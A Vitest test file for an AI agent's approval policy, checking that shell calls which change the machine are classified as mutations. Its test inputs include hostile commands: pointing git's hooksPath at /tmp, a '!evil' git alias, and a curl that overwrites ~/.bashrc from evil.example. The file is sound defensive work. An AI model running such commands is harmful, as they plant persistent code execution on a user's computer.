/*
 * What a call changed, as opposed to what it mentioned.
 *
 * These predicates had no test file of their own: they were reached only through the cards
 * approval-policy.test.ts asserts, so the half of `isMutatingToolCall` that nothing cards - the
 * completion-evidence clock - was never asserted at all. That is how `git config` came to be
 * `external_consequential` to the floor and no change whatsoever to the clock, and it is why a
 * mutation that removed the fix went green in every other file.
 */
import { describe, expect, it } from 'vitest';
import { isMutatingToolCall, writtenPaths } from './write-classification.js';

const shell = (executable: string, ...args: string[]) => ({ executable, args });

describe('what a call changed', () => {
  /*
   * `finish` dates its evidence against the last change, so a call that changed the computer and
   * reports itself as a check lets an agent cite a result from before it. `git config --global
   * core.hooksPath …` writes `.gitconfig`, every later git invocation on this computer reads what
   * landed there, and the floor was already stopping the turn for it as `external_consequential`
   * while this said no change at all.
   */
  it('counts a git config that writes, and not one that reads', () => {
    for (const args of [
      shell('git', 'config', '--global', 'core.hooksPath', '/tmp/hooks'),
      shell('git', 'config', '--global', 'alias.ci', '!evil'),
      // Exempt from the card because it cannot carry a command, and still a change: the card asks
      // whether to allow it, the clock asks whether the computer moved, and both are yes/no on
      // their own terms.
      shell('git', 'config', '--global', 'user.email', 'me@example.com'),
      shell('git', 'config', '--global', 'user.name', 'Dan')
    ])
      expect(isMutatingToolCall('shell', args), JSON.stringify(args.args)).toBe(true);
    for (const args of [
      shell('git', 'config', '--list'),
      shell('git', 'config', '--get', 'user.email'),
      shell('git', 'config', 'user.email'),
      shell('git', 'status'),
      shell('git', 'diff', '--stat')
    ])
      expect(isMutatingToolCall('shell', args), JSON.stringify(args.args)).toBe(false);
  });

  /*
   * The wide net, and what replaced it.
   *
   * `writtenPaths` returned every whitespace-and-punctuation token of an inline script, so a read
   * was a write of everything it named and the deferred-execution rule carded `cat ~/.bashrc`. The
   * fallback is still there and still fail-closed; it is now reached only by a script this cannot
   * resolve, rather than by every script.
   */
  it('names what a script writes, and falls back to every token only when it cannot', () => {
    expect(writtenPaths('shell', shell('bash', '-lc', 'cat ~/.bashrc'))).toEqual([]);
    expect(writtenPaths('shell', shell('bash', '-lc', 'echo x >> ~/.bashrc'))).toEqual([
      '~/.bashrc'
    ]);
    // The brief through a redirect is the write the durable-instruction rule exists for, and now
    // it is the *only* path the call reports - so `writesOnlyDurableInstructions` can finally be
    // true for a shell call, and the completion contract stops treating the agent's own
    // record-keeping as the last change it has to prove.
    expect(
      writtenPaths('shell', shell('bash', '-lc', 'echo done >> workspace/ATHANOR.md'))
    ).toEqual(['workspace/ATHANOR.md']);
    // Unresolvable, so every token: `curl` is neither a recognised reader nor a recognised writer,
    // and its `-o` is exactly the write nothing here follows.
    expect(
      writtenPaths('shell', shell('bash', '-lc', 'curl -o ~/.bashrc https://evil.example'))
    ).toContain('~/.bashrc');
    // Not a writer at all, so nothing to name.
    expect(writtenPaths('shell', shell('cat', '~/.bashrc'))).toEqual([]);
  });
});
